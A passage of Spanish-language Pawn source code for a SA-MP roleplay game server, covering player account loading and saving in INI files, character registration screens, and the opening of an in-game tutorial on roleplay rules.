			Dialog(playerid, dError, DIALOG_STYLE_MSGBOX, ""#CROJO"Cheat detectado", ""#CBLANCO"¡Empezamos Mal!\n\nEstá prohibido ingresar a este servidor con algún tipo de "#CROJO"Cheat o Hack.\n\nSi deseas jugar en el servidor, deberás quitartelo obligatoriamente. De lo contrario, no serás bienvenido aquí.\n\nSe sumó una advertencia a tu cuenta. Cuando llegues a las tres advertencias, te verás baneado.", "Cerrar", "");

		antic_Kick(playerid, "Entrar con hack");
	}
	return 1;
}

CALLBACK: Cargar_data(playerid,name[],value[])
{
	INI_Int("Contraseña",InfoJugador[playerid][jClave]);
	INI_String("Pregunta_de_seguridad", InfoJugador[playerid][jPreguntaS],MAX_CARACTERES_PS);
	INI_Int("Respuesta_de_seguridad", InfoJugador[playerid][jRespuestaS]);

	INI_Bool("Registrado", InfoJugador[playerid][jRegistrado] );

	INI_Int("Sexo", InfoJugador[playerid][jSexo] );
	INI_Int("Edad", InfoJugador[playerid][jEdad] );
	INI_Int("Pelea", InfoJugador[playerid][jPelea] );
	INI_Int("Estilo", InfoJugador[playerid][jEstilo] );
	INI_Int("DNI", InfoJugador[playerid][jDNI] );
	INI_Int("Admin",InfoJugador[playerid][jAdmin]);
	INI_Int("Interior",InfoJugador[playerid][jInterior]);
	INI_Int("VirtualWorld",InfoJugador[playerid][jVirtualWorld]);
	INI_Int("Dinero",InfoJugador[playerid][jDinero]);
	INI_Int("Lider",InfoJugador[playerid][jLider]);
	INI_Int("Miembro",InfoJugador[playerid][jMiembro]);
	INI_Int("Rango",InfoJugador[playerid][jRango]);
	INI_Int("Encarcelado",InfoJugador[playerid][jEncarcelado]);
	INI_Int("TiempoCarcel",InfoJugador[playerid][jTiempoCarcel]);
	new
		Str[18];

	Loop(i, MAX_ROPA, 0)
	{
	    A_Format(Str, "Ropa%d", i);
	    INI_Int(Str, InfoJugador[playerid][jRopa][i]);
	}
	Loop(i, MAX_OBJS, 0)
	{
	    A_Format(Str, "Objeto%d", i);
	    INI_Int(Str, InfoJugador[playerid][jObjeto][i]);
	}
	INI_Int("Nivel",InfoJugador[playerid][jNivel]);
	INI_Int("Minutos",InfoJugador[playerid][jMinutos]);
	INI_Int("Horas",InfoJugador[playerid][jHoras]);
	INI_Int("LiderFam",InfoJugador[playerid][jLiderFam]);
	INI_Int("MiembroFam",InfoJugador[playerid][jMiembroFam]);
	INI_Int("RangoFam",InfoJugador[playerid][jRangoFam]);
	INI_Int("Trabajo",InfoJugador[playerid][jTrabajo]);
	INI_Int("NivelTrabajo",InfoJugador[playerid][jNivelTrabajo]);
	INI_Int("Entregas",InfoJugador[playerid][jEntregas]);
	INI_Int("Saldo",InfoJugador[playerid][jSaldo]);
	INI_Int("Cosechas",InfoJugador[playerid][jCosechas]);
	INI_Int("IDCuentaB",InfoJugador[playerid][jIDCuentaB]);
	INI_Int("NumeroCel",InfoJugador[playerid][jNumeroCel]);
	INI_Bool("BuscadorVeh",InfoJugador[playerid][jBuscadorVeh]);
	INI_Int("Estrellas",InfoJugador[playerid][jEstrellas]);
	INI_Bool("Encendedor",InfoJugador[playerid][jEncendedor]);
	INI_Bool("Bomba",InfoJugador[playerid][jBomba]);
	INI_Int("Cigarrillos",InfoJugador[playerid][jCigarrillos]);
	INI_Int("Repartidas",InfoJugador[playerid][jRepartidas]);
	INI_Int("Barridas",InfoJugador[playerid][jBarridas]);
	INI_Int("Acento",InfoJugador[playerid][jAcento]);
	INI_Bool("Soga",InfoJugador[playerid][jSoga]);
	INI_Bool("Venda",InfoJugador[playerid][jVenda]);
	INI_Bool("Baneado",InfoJugador[playerid][jBaneado]);
	INI_Int("Ibu400",InfoJugador[playerid][jIbu400]);
	INI_Int("Ibu600",InfoJugador[playerid][jIbu600]);
	INI_Int("Seda",InfoJugador[playerid][jSeda]);
	INI_Int("Fasos",InfoJugador[playerid][jFasos]);
	INI_Int("Drogado",InfoJugador[playerid][jDrogado]);
	INI_Int("DutyS",InfoJugador[playerid][jDutyS]);
	INI_Int("DutyF",InfoJugador[playerid][jDutyF]);
	INI_Int("Adv",InfoJugador[playerid][jAdv]);
	INI_Int("AdmAdv",InfoJugador[playerid][jAdmAdv]);
	INI_Bool("Muerto",InfoJugador[playerid][jMuerto]);
	INI_Bool("BlockDudas",InfoJugador[playerid][jBlockDudas]);
	INI_Bool("BlockFam",InfoJugador[playerid][jBlockFam]);
	INI_Bool("BlockFac",InfoJugador[playerid][jBlockFac]);
	INI_Bool("TiempoDudas",InfoJugador[playerid][jTiempoDudas]);

	Loop(i,MAX_DROGAS,0)
	{
	    A_Format(Str,"Droga%d",i);
	    INI_Int(Str,InfoJugador[playerid][jDroga][i]);
	}

	Loop(i,MAX_MINERALES,0)
	{
	    A_Format(Str,"Mineral%d",i);
	    INI_Int(Str,InfoJugador[playerid][jMineral][i]);
	    A_Format(Str,"MineralF%d",i);
	    INI_Int(Str,InfoJugador[playerid][jMineralF][i]);
	}

	Loop(i,13,0)
	{
		A_Format(Str,"Arma%d",i);
		INI_Int(Str,InfoJugador[playerid][jArmas][i]);
		A_Format(Str,"Balas%d",i);
		INI_Int(Str,InfoJugador[playerid][jBalas][i]);
	}
	INI_Bool("LicenciaAuto",InfoJugador[playerid][jLicenciaAuto]);
	INI_Bool("LicenciaMoto",InfoJugador[playerid][jLicenciaMoto]);
	INI_Bool("LicenciaArmas",InfoJugador[playerid][jLicenciaArmas]);

	if(strfind(name, "C_Nombre") == 0)
	{
	    CargarContacto(playerid, name, value, false);
	}
	if(strfind(name, "Contacto") == 0)
	{
	    CargarContacto(playerid, name, value, true);
	}

	Loop(i,7,0)
	{
		A_Format(Str,"Accesorio%d",i);
		INI_Int(Str,InfoJugador[playerid][jAccesorio][i]);
	}
	Loop(i,10,0)
	{
		A_Format(Str,"AttachModel%d",i);
		INI_Int(Str,InfoJugador[playerid][jAttachModel][i]);
		A_Format(Str,"AttachBone%d",i);
		INI_Int(Str,InfoJugador[playerid][jAttachBone][i]);
		A_Format(Str,"AttachPosx%d",i);
		INI_Float(Str,InfoJugador[playerid][jAttachPosx][i]);
		A_Format(Str,"AttachPosy%d",i);
		INI_Float(Str,InfoJugador[playerid][jAttachPosy][i]);
		A_Format(Str,"AttachPosz%d",i);
		INI_Float(Str,InfoJugador[playerid][jAttachPosz][i]);
		A_Format(Str,"AttachAngx%d",i);
		INI_Float(Str,InfoJugador[playerid][jAttachAngx][i]);
		A_Format(Str,"AttachAngy%d",i);
		INI_Float(Str,InfoJugador[playerid][jAttachAngy][i]);
		A_Format(Str,"AttachAngz%d",i);
		INI_Float(Str,InfoJugador[playerid][jAttachAngz][i]);
		A_Format(Str,"AttachEscx%d",i);
		INI_Float(Str,InfoJugador[playerid][jAttachEscx][i]);
		A_Format(Str,"AttachEscy%d",i);
		INI_Float(Str,InfoJugador[playerid][jAttachEscy][i]);
		A_Format(Str,"AttachEscz%d",i);
		INI_Float(Str,InfoJugador[playerid][jAttachEscz][i]);
		if(i < 7)
		{
			A_Format(Str,"AttachOcultado%d",i);
			INI_Bool(Str,InfoJugador[playerid][jAttachOcultado][i]);
		}
	}

	INI_Float("PosX",PosJugador[X]);
	INI_Float("PosY",PosJugador[Y]);
	INI_Float("PosZ",PosJugador[Z]);
	INI_Float("Vida",InfoJugador[playerid][jVida]);
	INI_Float("Chaleco",InfoJugador[playerid][jChaleco]);
	INI_Float("Experiencia",InfoJugador[playerid][jExperiencia]);
	INI_Float("Hambre",InfoJugador[playerid][jHambre]);
	INI_Float("Cansancio",InfoJugador[playerid][jCansancio]);
	INI_Float("Orina",InfoJugador[playerid][jOrina]);

	return 1;
}

stock CargarContacto(playerid, name[], value[], bool:number)
{
	new
	    index = strval(name[8]);

	if( 0 <= index <= 10 )
	{
		if(!number)
		{
	    	CambiarNombreContacto(playerid, index, value);
		}
		else
	 	{
			new
			    val = strval(value);

			if(val != 0 && InfoJugador[playerid][jContacto][index] == 0)
			{
		 		InfoJugador[playerid][jContacto][index] = val;
			}
	 	}
	}
 	return 1;
}

CALLBACK: ActualizarCuenta(playerid)
{
	if(!IsPlayerConnected(playerid) || !GetPVarInt(playerid,"CargoCuenta") || GetPVarInt(playerid, "VIENDO_TV")) return false;

	//Integrer
	#define SaveVInt(%1);		if(InfoJugadorTemp[playerid][j%1] != InfoJugador[playerid][j%1])\
	                        	{\
									INI_WriteInt(Arch,#%1,InfoJugador[playerid][j%1]);\
									InfoJugadorTemp[playerid][j%1] = InfoJugador[playerid][j%1];\
								}
	//Floats
	#define SaveVFloat(%1);		if(InfoJugadorTemp[playerid][j%1] != InfoJugador[playerid][j%1])\
	                        	{\
									INI_WriteFloat(Arch,#%1,InfoJugador[playerid][j%1]);\
									InfoJugadorTemp[playerid][j%1] = InfoJugador[playerid][j%1];\
								}
	//Bool
	#define SaveVBool(%1);		if(InfoJugadorTemp[playerid][j%1] != InfoJugador[playerid][j%1])\
	                        	{\
									INI_WriteBool(Arch,#%1,InfoJugador[playerid][j%1]);\
									InfoJugadorTemp[playerid][j%1] = InfoJugador[playerid][j%1];\
								}

	new
	    INI:Arch = INI_Open(U_Usuario(playerid));

	new
		Str[15];

	INI_SetTag(Arch, "data");
	
	SaveVBool(Registrado);
 	SaveVInt(Sexo);
 	SaveVInt(Edad);
 	SaveVInt(Pelea);
 	SaveVInt(Estilo);
 	SaveVInt(DNI);

	Loop(i, MAX_ROPA, 0)
 	{
 	    if(InfoJugadorTemp[playerid][jRopa][i] != InfoJugador[playerid][jRopa][i])
 	    {
 	        A_Format(Str, "Ropa%d", i);
 	        INI_WriteInt(Arch,Str,InfoJugador[playerid][jRopa][i]);
 	        InfoJugadorTemp[playerid][jRopa][i] = InfoJugador[playerid][jRopa][i];
		}
	}
	
 	SaveVInt(Dinero);
 	SaveVInt(Nivel);
 	SaveVFloat(Experiencia);
 	SaveVInt(Admin);
 	SaveVInt(Lider);
 	SaveVInt(Miembro);
 	SaveVInt(Rango);
 	SaveVInt(Vehiculo);
 	SaveVInt(Encarcelado);
 	SaveVInt(TiempoCarcel);
 	SaveVInt(Minutos);
 	SaveVInt(Horas);
 	SaveVInt(LiderFam);
 	SaveVInt(MiembroFam);
 	SaveVInt(RangoFam);
 	SaveVInt(Trabajo);
 	SaveVInt(NivelTrabajo);
 	SaveVInt(Entregas);
 	SaveVInt(Saldo);
 	SaveVInt(IDCuentaB);
 	SaveVInt(NumeroCel);
 	SaveVBool(BuscadorVeh);
 	SaveVBool(LicenciaAuto);
 	SaveVBool(LicenciaMoto);
 	SaveVBool(LicenciaArmas);
 	SaveVInt(Cosechas);
 	SaveVInt(Estrellas);
 	SaveVBool(Encendedor);
 	SaveVBool(Bomba);
 	SaveVInt(Cigarrillos);
 	SaveVInt(Repartidas);
 	SaveVInt(Barridas);
 	SaveVInt(Acento);
 	SaveVBool(Soga);
 	SaveVBool(Venda);
 	SaveVBool(Baneado);
 	SaveVBool(Muerto);
 	SaveVBool(BlockDudas);
 	SaveVBool(BlockFam);
 	SaveVBool(BlockFac);
 	SaveVInt(TiempoDudas);
 	SaveVInt(Ibu400);
 	SaveVInt(Ibu600);
 	SaveVInt(Seda);
 	SaveVInt(DutyS);
 	SaveVInt(DutyF);
 	SaveVInt(Adv);
 	SaveVInt(AdmAdv);

	Loop(i, MAX_MINERALES, 0)
 	{
 	    if(InfoJugadorTemp[playerid][jMineral][i] != InfoJugador[playerid][jMineral][i])
 	    {
 	        A_Format(Str, "Mineral%d", i);
 	        INI_WriteInt(Arch,Str,InfoJugador[playerid][jMineral][i]);
 	        InfoJugadorTemp[playerid][jMineral][i] = InfoJugador[playerid][jMineral][i];
		}
 	    if(InfoJugadorTemp[playerid][jMineralF][i] != InfoJugador[playerid][jMineralF][i])
 	    {
 	        A_Format(Str, "MineralF%d", i);
 	        INI_WriteInt(Arch,Str,InfoJugador[playerid][jMineralF][i]);
 	        InfoJugadorTemp[playerid][jMineralF][i] = InfoJugador[playerid][jMineralF][i];
		}
	}
	Loop(i, MAX_DROGAS, 0)
 	{
 	    if(InfoJugadorTemp[playerid][jDroga][i] != InfoJugador[playerid][jDroga][i])
 	    {
 	        A_Format(Str, "Droga%d", i);
 	        INI_WriteInt(Arch,Str,InfoJugador[playerid][jDroga][i]);
 	        InfoJugadorTemp[playerid][jDroga][i] = InfoJugador[playerid][jDroga][i];
 	    }
	}

 	SaveVInt(Fasos);
 	SaveVInt(Drogado);

	new
	    Float: PosX,
		Float: PosY,
		Float: PosZ;

	GetPlayerPos(playerid, PosX, PosY, PosZ);
	
	INI_WriteFloat(Arch, "PosX", PosX);
	INI_WriteFloat(Arch, "PosY", PosY);
	INI_WriteFloat(Arch, "PosZ", PosZ);

	GetPlayerFacingAngle(playerid, PosX);
	INI_WriteFloat(Arch, "Angulo", PosX);

	GetPlayerHealth(playerid, PosX);
	INI_WriteFloat(Arch, "Vida", PosX);

	GetPlayerArmour(playerid, PosX);
	INI_WriteFloat(Arch, "Chaleco", PosX);

	INI_WriteFloat(Arch, "Hambre",InfoJugador[playerid][jHambre]);
	INI_WriteFloat(Arch, "Cansancio",InfoJugador[playerid][jCansancio]);
	INI_WriteFloat(Arch, "Orina",InfoJugador[playerid][jOrina]);

	INI_WriteFloat(Arch, "Interior",GetPlayerInterior(playerid));
	INI_WriteFloat(Arch, "VirtualWorld",GetPlayerVirtualWorld(playerid));

	INI_WriteInt(Arch, "Dinero", GetPlayerMoney(playerid) );
	
	new
		Arma,
		Balas;

	Loop(i,12,0)
	{
	    Arma = 0;
	    Balas = 0;
		GetPlayerWeaponData(playerid, i, Arma, Balas);
		A_Format(Str,"Arma%d",i);
		INI_WriteInt(Arch, Str,Arma);
		A_Format(Str,"Balas%d",i);
		INI_WriteInt(Arch, Str,Balas);
	}
	INI_Close(Arch);
	return 1;
}

stock SaveIp(playerid)
{
	new
	    ip[16],
		INI:Arch = INI_Open(U_Usuario(playerid));

	GetPlayerIp(playerid, ip, 16);
	INI_SetTag(Arch, "data");
	INI_WriteString(Arch, "IP", ip);
	INI_Close(Arch);
	return 1;
}

stock ActualizarAccesorios(playerid, slot=-1)
{
	new
		Str[18],
		INI:Arch = INI_Open(U_Usuario(playerid));

	INI_SetTag(Arch, "data");
	
	if(slot == -1)
	{
		Loop(i,10,0)
		{
			A_Format(Str,"AttachModel%d",i);
			INI_WriteInt(Arch,Str,InfoJugador[playerid][jAttachModel][i]);
			A_Format(Str,"AttachBone%d",i);
			INI_WriteInt(Arch,Str,InfoJugador[playerid][jAttachBone][i]);
			A_Format(Str,"AttachPosx%d",i);
			INI_WriteFloat(Arch,Str,InfoJugador[playerid][jAttachPosx][i]);
			A_Format(Str,"AttachPosy%d",i);
			INI_WriteFloat(Arch,Str,InfoJugador[playerid][jAttachPosy][i]);
			A_Format(Str,"AttachPosz%d",i);
			INI_WriteFloat(Arch,Str,InfoJugador[playerid][jAttachPosz][i]);
			A_Format(Str,"AttachAngx%d",i);
			INI_WriteFloat(Arch,Str,InfoJugador[playerid][jAttachAngx][i]);
			A_Format(Str,"AttachAngy%d",i);
			INI_WriteFloat(Arch,Str,InfoJugador[playerid][jAttachAngy][i]);
			A_Format(Str,"AttachAngz%d",i);
			INI_WriteFloat(Arch,Str,InfoJugador[playerid][jAttachAngz][i]);
			A_Format(Str,"AttachEscx%d",i);
			INI_WriteFloat(Arch,Str,InfoJugador[playerid][jAttachEscx][i]);
			A_Format(Str,"AttachEscy%d",i);
			INI_WriteFloat(Arch,Str,InfoJugador[playerid][jAttachEscy][i]);
			A_Format(Str,"AttachEscz%d",i);
			INI_WriteFloat(Arch,Str,InfoJugador[playerid][jAttachEscz][i]);
			if(i < 7)
			{
				A_Format(Str,"AttachOcultado%d",i);
				INI_WriteBool(Arch,Str,InfoJugador[playerid][jAttachOcultado][i]);
			}
		}
	}
	else if(slot > -1 && slot < 10)
	{
		A_Format(Str,"AttachModel%d",slot);
		INI_WriteInt(Arch,Str,InfoJugador[playerid][jAttachModel][slot]);
		A_Format(Str,"AttachBone%d",slot);
		INI_WriteInt(Arch,Str,InfoJugador[playerid][jAttachBone][slot]);
		A_Format(Str,"AttachPosx%d",slot);
		INI_WriteFloat(Arch,Str,InfoJugador[playerid][jAttachPosx][slot]);
		A_Format(Str,"AttachPosy%d",slot);
		INI_WriteFloat(Arch,Str,InfoJugador[playerid][jAttachPosy][slot]);
		A_Format(Str,"AttachPosz%d",slot);
		INI_WriteFloat(Arch,Str,InfoJugador[playerid][jAttachPosz][slot]);
		A_Format(Str,"AttachAngx%d",slot);
		INI_WriteFloat(Arch,Str,InfoJugador[playerid][jAttachAngx][slot]);
		A_Format(Str,"AttachAngy%d",slot);
		INI_WriteFloat(Arch,Str,InfoJugador[playerid][jAttachAngy][slot]);
		A_Format(Str,"AttachAngz%d",slot);
		INI_WriteFloat(Arch,Str,InfoJugador[playerid][jAttachAngz][slot]);
		A_Format(Str,"AttachEscx%d",slot);
		INI_WriteFloat(Arch,Str,InfoJugador[playerid][jAttachEscx][slot]);
		A_Format(Str,"AttachEscy%d",slot);
		INI_WriteFloat(Arch,Str,InfoJugador[playerid][jAttachEscy][slot]);
		A_Format(Str,"AttachEscz%d",slot);
		INI_WriteFloat(Arch,Str,InfoJugador[playerid][jAttachEscz][slot]);
		if(slot < 7)
		{
			A_Format(Str,"AttachOcultado%d",slot);
			INI_WriteBool(Arch,Str,InfoJugador[playerid][jAttachOcultado][slot]);
		}
	}
	INI_Close(Arch);
	return 1;
}


CALLBACK: CargarAttachedO(playerid)
{
	Loop(i,10,0)
	{
	    if(InfoJugador[playerid][jAttachModel][i])
		{
		    if(i < 7)
		    {
		        //Almacenar en jAccesorio
		        Loop(a, sizeof AttachmentObjects, 0)
		            if(AttachmentObjects[a][attachmodel] == InfoJugador[playerid][jAttachModel][i])
		                InfoJugador[playerid][jAccesorio][i] = a;

		    	if(InfoJugador[playerid][jAttachOcultado][i] == false)
		    	{
					SetPlayerAttachedObject(playerid,i,InfoJugador[playerid][jAttachModel][i],InfoJugador[playerid][jAttachBone][i],InfoJugador[playerid][jAttachPosx][i],InfoJugador[playerid][jAttachPosy][i],InfoJugador[playerid][jAttachPosz][i],InfoJugador[playerid][jAttachAngx][i],InfoJugador[playerid][jAttachAngy][i],InfoJugador[playerid][jAttachAngz][i],InfoJugador[playerid][jAttachEscx][i],InfoJugador[playerid][jAttachEscy][i],InfoJugador[playerid][jAttachEscz][i]);
				}
				else
				{
				    continue;
				}
			}
			else
			{
				SetPlayerAttachedObject(playerid,i,InfoJugador[playerid][jAttachModel][i],InfoJugador[playerid][jAttachBone][i],InfoJugador[playerid][jAttachPosx][i],InfoJugador[playerid][jAttachPosy][i],InfoJugador[playerid][jAttachPosz][i],InfoJugador[playerid][jAttachAngx][i],InfoJugador[playerid][jAttachAngy][i],InfoJugador[playerid][jAttachAngz][i],InfoJugador[playerid][jAttachEscx][i],InfoJugador[playerid][jAttachEscy][i],InfoJugador[playerid][jAttachEscz][i]);
			}
		}
	}
	return 1;
}


CALLBACK: Registrar(playerid)
{

	TogglePlayerSpectating(playerid, false);

	SetPVarInt(playerid,"Registrandose",1);

	LimpiarPantalla(playerid,10);
	SetPlayerInterior(playerid,5);

	InfoJugador[playerid][jSexo] = 1;
	InfoJugador[playerid][jEdad] = 18;
	InfoJugador[playerid][jPelea] = 1;
	InfoJugador[playerid][jEstilo] = 1;
	InfoJugador[playerid][jDinero] = 2000;
	InfoJugador[playerid][jDNI] = Rand(100000,900000);

	SetPlayerHealth(playerid,100);
	SetPlayerArmour(playerid,0);
	SetPlayerDrunkLevel(playerid, 0);

	SetPlayerPos(playerid, -1902.3170, 16.8255, 1061.1436);
	SetPlayerFacingAngle(playerid, 180.0);
	SetPlayerSkin(playerid, 60);

	SetPlayerCameraPos(playerid,-1901.000,14.000,1062.000);
	SetPlayerCameraLookAt(playerid,-1903.000,18.000,1061.000);

	TogglePlayerControllable(playerid,false);

	Sexo[playerid] = CreatePlayerTextDraw(playerid,470.000000, 150.000000, "~r~MASCULINO");

	PlayerTextDrawBackgroundColor(playerid,Sexo[playerid], 255);
	PlayerTextDrawFont(playerid,Sexo[playerid], 2);
	PlayerTextDrawLetterSize(playerid,Sexo[playerid], 0.400000, 2.799999);
	PlayerTextDrawColor(playerid,Sexo[playerid], -1);
	PlayerTextDrawSetOutline(playerid,Sexo[playerid], 1);
	PlayerTextDrawSetProportional(playerid,Sexo[playerid], 1);

	Edad[playerid] = CreatePlayerTextDraw(playerid,503.000000, 202.000000, "~r~18");

	PlayerTextDrawBackgroundColor(playerid,Edad[playerid], 255);
	PlayerTextDrawFont(playerid,Edad[playerid], 2);
	PlayerTextDrawLetterSize(playerid,Edad[playerid],0.400000, 2.799999);
	PlayerTextDrawColor(playerid,Edad[playerid], -1);
	PlayerTextDrawSetOutline(playerid,Edad[playerid], 1);
	PlayerTextDrawSetProportional(playerid,Edad[playerid], 1);

	Pelea[playerid] = CreatePlayerTextDraw(playerid,517.000000, 255.000000, "~r~boxeo");

	PlayerTextDrawBackgroundColor(playerid,Pelea[playerid], 255);
	PlayerTextDrawAlignment(playerid,Pelea[playerid], 2);
	PlayerTextDrawFont(playerid,Pelea[playerid], 2);
	PlayerTextDrawLetterSize(playerid,Pelea[playerid],  0.400000, 2.799999);
	PlayerTextDrawColor(playerid,Pelea[playerid], -1);
	PlayerTextDrawSetOutline(playerid,Pelea[playerid], 1);
	PlayerTextDrawSetProportional(playerid,Pelea[playerid], 1);

	Estilo[playerid] = CreatePlayerTextDraw(playerid,516.000000, 310.000000, "~r~normal");

	PlayerTextDrawBackgroundColor(playerid,Estilo[playerid], 255);
	PlayerTextDrawFont(playerid,Estilo[playerid], 2);
	PlayerTextDrawAlignment(playerid,Estilo[playerid], 2);
	PlayerTextDrawLetterSize(playerid,Estilo[playerid],  0.300000, 2.799998);
	PlayerTextDrawColor(playerid,Estilo[playerid], -1);
	PlayerTextDrawSetOutline(playerid,Estilo[playerid], 1);
	PlayerTextDrawSetProportional(playerid,Estilo[playerid], 1);

	//Mostrar Textos
	PlayerTextDrawShow(playerid,Sexo[playerid]);
	PlayerTextDrawShow(playerid,Edad[playerid]);
	PlayerTextDrawShow(playerid,Pelea[playerid]);
	PlayerTextDrawShow(playerid,Estilo[playerid]);

	TextDrawShowForPlayer(playerid,Registro[0]);
	TextDrawShowForPlayer(playerid,Registro[1]);
	TextDrawShowForPlayer(playerid,Registro[2]);
	TextDrawShowForPlayer(playerid,Registro[3]);
	TextDrawShowForPlayer(playerid,Registro[4]);
	TextDrawShowForPlayer(playerid,Registro[5]);

	TextDrawShowForPlayer(playerid,FlechaSexo[0]);
	TextDrawShowForPlayer(playerid,FlechaSexo[1]);

	TextDrawShowForPlayer(playerid,FlechaEdad[0]);
	TextDrawShowForPlayer(playerid,FlechaEdad[1]);

	TextDrawShowForPlayer(playerid,FlechaPelea[0]);
	TextDrawShowForPlayer(playerid,FlechaPelea[1]);

	TextDrawShowForPlayer(playerid,FlechaEstilo[0]);
	TextDrawShowForPlayer(playerid,FlechaEstilo[1]);

	SelectTextDraw(playerid, C_ROJO);

	return 1;
}

CALLBACK: MostrarDatos(playerid)
{
	new Datos[3][16];
	switch(InfoJugador[playerid][jSexo])
	{
	    case 1:  Datos[0] = "Masculino";
	    case 2:  Datos[0] = "Femenino";
		default: Datos[0] = "Otro";
	}
	switch(InfoJugador[playerid][jPelea])
	{
	    case 1:  Datos[1] = "Boxeo";
	    case 2:  Datos[1] = "KungFu";
	    case 3:  Datos[1] = "Kick Boxing";
		default: Datos[1] = "Otro";
	}
	switch(InfoJugador[playerid][jEstilo])
	{
	    case 1:  Datos[2] = "Normal";
	    case 2:  Datos[2] = "Pandillero";
	    case 3:  Datos[2] = "Pandillero 2";
	    case 4:  Datos[2] = "Anciano";
	    case 5:  Datos[2] = "Anciano gordo";
	    case 6:  Datos[2] = "Gordo";
	    case 7:  Datos[2] = "Mujer";
	    case 8:  Datos[2] = "Mujer 2";
	    case 9:  Datos[2] = "Sexi";
	    case 10: Datos[2] = "Sexi 2";
	    case 11: Datos[2] = "Hebrio";
	    case 12: Datos[2] = "Ciego";
		default: Datos[2] = "Otro";
	}

    new SDialog[256];

    format(SDialog,sizeof(SDialog),""#CBLANCO"Sexo: "#CINFO"%s\n"#CBLANCO"Edad: "#CINFO"%d\n"#CBLANCO"Fecha de nacimiento: "#CINFO"%d\n"#CBLANCO"Estilo de pelea: "#CINFO"%s\n"#CBLANCO"Estilo: "#CINFO"%s.\n\n¿Confirmar estos datos, e ingresar al tutorial?",Datos[0],InfoJugador[playerid][jEdad],(CheckEpoca()-InfoJugador[playerid][jEdad]),Datos[1],Datos[2] );
	Dialog(playerid,dDatos,DIALOG_STYLE_MSGBOX,""#CPOSITIVO"Datos de su personaje",SDialog,"Proceder","Volver");
	return 1;
}

CALLBACK: Float:GetDistanceFromPointToPoint(Float:X,Float:Y, Float:Z,Float:tX,Float:tY,Float:tZ)
{
	return floatsqroot((tX-X)*(tX-X)+(tY-Y)*(tY-Y)+(tZ-Z)*(tZ-Z));
}

stock Auto_InterpolateCameraPos(playerid, Float:x, Float:y, Float:z, Float:tx, Float:ty, Float:tz)
{
	new
		Unused;

	Unused = int(GetDistanceFromPointToPoint(x, y, z, tx, ty, tz) * 10);

    return InterpolateCameraPos(playerid, x, y, z, tx, ty, tz, Unused, CAMERA_MOVE);
}

stock Auto_InterpolateCameraLookAtTut(playerid, Float:x, Float:y, Float:z, Float:tx, Float:ty, Float:tz)
{
	new
		Unused;

	Unused = int(GetDistanceFromPointToPoint(x, y, z, tx, ty, tz) * 10);

    return InterpolateCameraLookAt(playerid, x, y, z, tx, ty, tz, Unused, CAMERA_MOVE);
}


CALLBACK: ConceptosDeRol(playerid)
{
	MostrarTDTutorial(playerid);
  	switch(GetPVarInt(playerid,"ParteConceptos"))
  	{
		case 1:
		{
			PlayerTextDrawShow(playerid, TituloTuto[playerid]);
			PlayerTextDrawShow(playerid, InfoTuto[playerid][0]);
			PlayerTextDrawShow(playerid, InfoTuto[playerid][1]);
			PlayerTextDrawShow(playerid, InfoTuto[playerid][2]);
		    SetPlayerInterior(playerid,0);

			SetPlayerCameraPos(playerid,CamaraAeropuerto);
			SetPlayerCameraLookAt(playerid,CamaraAeropuertoAt);
			PlayerTextDrawSetString(playerid,TituloTuto[playerid],"Server RolePlay");
			PlayerTextDrawSetString(playerid,InfoTuto[playerid][0],"Este es un servidor RolePlay, pero.. ¿Qué es RolePlay?");
			PlayerTextDrawSetString(playerid,InfoTuto[playerid][1],"Se trata de que tu jugador represente un rol, y actue como en la realidad");
			PlayerTextDrawSetString(playerid,InfoTuto[playerid][2],"es decir, que debes actuar como lo haria esa persona que tu representas");
			Mensaje(playerid,-1,"Para pasar a la siguiente parte en el tutorial, solo presione "#CINFO"' Click izquierdo '");
		}
		case 2:
		{
			LimpiarPantalla(playerid,10);
	  		PlayerTextDrawSetString(playerid,TituloTuto[playerid],"Server RolePlay");
	    	PlayerTextDrawSetString(playerid,InfoTuto[playerid][0],"Si eres un policía, mafioso, pandillero, o lo que quieras. Claro que no es nada fácil.");
	    	PlayerTextDrawSetString(playerid,InfoTuto[playerid][1],"Existen muchas reglas en este modo de juego, reglas que son utilizadas para que se pueda");
	    	PlayerTextDrawSetString(playerid,InfoTuto[playerid][2],"jugar sin problemas, y reglas que detienen el abuso de las habilidades del personaje.");
		}
		case 3:
		{
			LimpiarPantalla(playerid,10);
	 		PlayerTextDrawSetString(playerid,TituloTuto[playerid],"Conceptos de rol");
	 		PlayerTextDrawSetString(playerid,InfoTuto[playerid][0],"A estas reglas, las llamaremos ''conceptos de rol''. Si tu te niegas a cumplir aquellas reglas");
	 		PlayerTextDrawSetString(playerid,InfoTuto[playerid][1],"impuestas para este modo de juego, el Staff (Administradores y moderadores) o hasta el servidor mismo");
	 		PlayerTextDrawSetString(playerid,InfoTuto[playerid][2],"te castigará, ya sea enviandote a la carcel, o expulsandote del servidor.");
		}
		case 4:
		{
			LimpiarPantalla(playerid,10);
	 		PlayerTextDrawSetString(playerid,TituloTuto[playerid],"Conceptos de rol");
	 		PlayerTextDrawSetString(playerid,InfoTuto[playerid][0],"Te explicaremos en profundidad cada uno de estos conceptos del RolePlay");
	 		PlayerTextDrawSetString(playerid,InfoTuto[playerid][1],"Existan comandos, utilizados para preguntarle a nuestro equipo sobre cualquier duda que tengas.");
	 		PlayerTextDrawSetString(playerid,InfoTuto[playerid][2],"El principal, es (/duda [Tu duda y/o problema])");
		}
		case 5:
		{
			LimpiarPantalla(playerid,10);
	  		PlayerTextDrawSetString(playerid,TituloTuto[playerid],"DeathMatch (DM)");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][0],"El concepto denominado \"DeathMatch\" es todo aquel que haga una \"muerte por diversion\" o tambien");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][1],"\"sin rol\". Mas especificamente hablando.El DeathMatch (DM) es una regla basica del genero RolePlay");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][2],"la cual consiste en ya seas tu u otro jugador, herir o matara alguien sin rolear la razón del hecho.");
		}
		case 6:
		{
			LimpiarPantalla(playerid,10);
	  		PlayerTextDrawSetString(playerid,TituloTuto[playerid]," ");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][0],"Cada vez que hagas una accion en el juego, de cualquier tipo, piensa:");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][1],"- ¿Esto, es lo que haria en la vida real si yo fuera este, y estaria en esta situación?");
	  		PlayerTextDrawSetString(playerid,InfoTuto[playerid][2],"¿En este caso, cómo actuaria en la realidad? ~g~Esta es la forma mas eficiente de aprender a ~p~ROLEAR!");
		}
		case 7:
		{
			LimpiarPantalla(playerid,10);
